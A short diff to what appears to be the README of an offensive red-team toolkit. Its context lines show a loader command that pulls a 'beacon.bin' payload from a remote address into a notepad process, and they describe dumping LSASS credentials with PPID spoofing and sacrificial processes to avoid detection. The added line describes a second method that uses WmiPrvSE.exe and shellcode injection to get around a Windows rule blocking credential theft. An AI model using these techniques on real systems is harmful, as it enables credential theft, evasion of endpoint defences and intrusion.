@@ -101,6 +101,8 @@ C:\>KarenLdr.exe -u "https://192.168.231.128:443/beacon.bin" -t notepad -p 9524 
 KarenDumpedMi demonstrates 2 different methods to dump the Local Security Authority Subsystem Service (LSASS) process from memory. This requires SYSTEM* privileges and AMSI bypass to interact with the LSASS process.
 
 Method 1 leverages `MiniDumpWriteDump` from `Dbghelp.dll` to perform a user-mode minidump. To evade behavioural detection, spoof the PPID to `winlogon.exe` and set the spawnto sacrificial process to either `WerFault.exe` or `svchost.exe`.
+
+Method 2 leverages `WmiPrvSE.exe` and shellcode injection to dump LSASS on an endpoint with the ASR rule of "Block credential stealing from the Windows local security authority subsystem (lsass.exe)" enabled.
 ```
 C:\>KarenDumpedMi.exe
      _        _______  _______  _______  _        ______            _______  _______  _______  ______   _______ _________
